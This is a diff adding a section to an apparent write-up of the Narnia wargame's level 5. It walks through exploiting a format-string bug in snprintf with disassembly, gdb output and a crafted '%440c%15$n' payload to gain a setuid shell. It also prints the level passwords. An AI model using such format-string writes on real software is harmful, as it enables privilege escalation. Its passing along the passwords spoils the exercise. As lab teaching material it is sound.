@@ -242,3 +242,49 @@ Verification: each password was accepted by logging in as the next level's accou
 - **Verification:** logged in as `narnia5` with this password (`whoami` → `narnia5`).
 - **Recording:** `recordings/narnia/L4.cast`
 
+## Level 5 → narnia6
+- **Account:** `narnia5`, password `4VhyE9TRcd`.
+- **Goal:** `main` has `int i = 1; char buffer[64];` and does `snprintf(buffer, sizeof buffer, argv[1]);` — **`argv[1]` is used as the format string**. If `i == 500` the program prints `GOOD`, does `setreuid(geteuid(),geteuid())` and runs `system("/bin/sh")`. On failure it prints the buffer and `i = %d (%p)`, leaking the address of `i`.
+- **Technique and why it works:** a format-string bug. `%n` writes the number of characters printed so far into the pointer passed as the corresponding argument. The trick is that `snprintf`'s *destination* is the same 64-byte buffer that overlaps the varargs area on the stack: with the argument string being the format string, vararg *k* lives at `buffer + 4*(k-1)`. So if we write 56 filler bytes followed by the 4-byte address of `i`, that address becomes vararg 15. Then `%440c` prints 440 characters (56 filler + 4 address + 440 = 500), and `%15$n` writes 500 into `i`. `i` is at `ebp-0x8` and `buffer` at `ebp-0x48`, so `i` is exactly `buffer+64`.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the source.** `cat /narnia/narnia5.c` → `snprintf(buffer, sizeof buffer, argv[1]);`, `if(i==500)` → `system("/bin/sh")`; failure prints `i = %d (%p)`.
+2. **Locate the variables.** `objdump -d --no-show-raw-insn /narnia/narnia5 | sed -n '/<main>:/,/ret/p'`:
+   ```
+   movl $0x1,-0x8(%ebp)          # i = 1, at ebp-0x8
+   lea -0x48(%ebp),%eax          # buffer, at ebp-0x48
+   push %eax; push $0x40; push argv[1]; call snprintf@plt
+   ```
+   So `i` is exactly 64 bytes above `buffer`.
+3. **Check protections.** `file` → setuid ELF 32-bit; `readelf -lW | grep GNU_STACK` → `RW` (non-executable stack, irrelevant here — this is not a code-injection level).
+4. **See the layout in gdb.**
+   ```
+   gdb -batch -ex 'b *0x80491e3' -ex 'run AAAA' -ex 'p/x $ebp-0x8' -ex 'p/x $ebp-0x48' -ex 'p $esp' -ex 'x/12wx $esp' /narnia/narnia5
+   # $1 = 0xffffd3a0   (i)      $2 = 0xffffd360   (buffer)      $3 = 0xffffd354 (esp)
+   # 0xffffd354: 0xffffd360 0x00000040 0xffffd5fc 0x00000040
+   ```
+   The first vararg slot (`esp+4`) is `0x40`, the second (`esp+8`) is the argv pointer — and `buffer` itself sits at `esp+12`. That is why the format string reads its own output: vararg *k* = `buffer + 4*(k-1)`.
+5. **Probe the format string.** `/narnia/narnia5 'AAAA.%08x.%08x.%08x.%08x.%08x.%08x'` prints the arguments; the values shown are bytes of the string itself, confirming the overlap.
+6. **The address of `i` moves with the environment.** The program helpfully prints `i = 1 (0xffffd3c0)`, so the exploit first runs the binary with an argument of the *same length* and the *same (empty) environment*, reads `&i` from that output, and then builds the real payload with it. This is the general fix for stack-address dependence without ASLR (here ASLR is 0, but the address still depends on the environment size).
+7. **Build the payload** (in `L5.py`):
+   ```
+   fmt = b"A" * 56 + struct.pack("<I", addr) + b"%440c%15$n"
+   ```
+   - 56 filler bytes put the 4-byte address at offset 56, i.e. `buffer+56`, which is vararg 15.
+   - `%440c` consumes vararg 1 (the integer `0x40`, i.e. 64) as a character and pads to 440 characters. The total output so far is 56 + 4 + 440 = **500**.
+   - `%15$n` stores that 500 into the pointer at vararg 15, which is `&i`.
+   - `snprintf` writes at most 64 bytes into `buffer`, and `buffer[63] = 0` truncates the output — the `%n` has already fired by then.
+8. **Run it.** `python3 /tmp/e_narnia5.py` probes, prints `probe says &i = 0xffffddd0`, then execs the binary. Output:
+   ```
+   Change i's value from 1 -> 500. GOOD
+   ```
+   and the program drops into a shell.
+9. **Use the shell.**
+   ```
+   id                        # uid=14006(narnia6) gid=14005(narnia5)
+   cat /etc/narnia_pass/narnia6
+   ```
+- **Password for narnia6:** `uK3ikaZLxB`
+- **Verification:** logged in as `narnia6` with this password (`whoami` → `narnia6`).
+- **Recording:** `recordings/narnia/L5.cast`
+
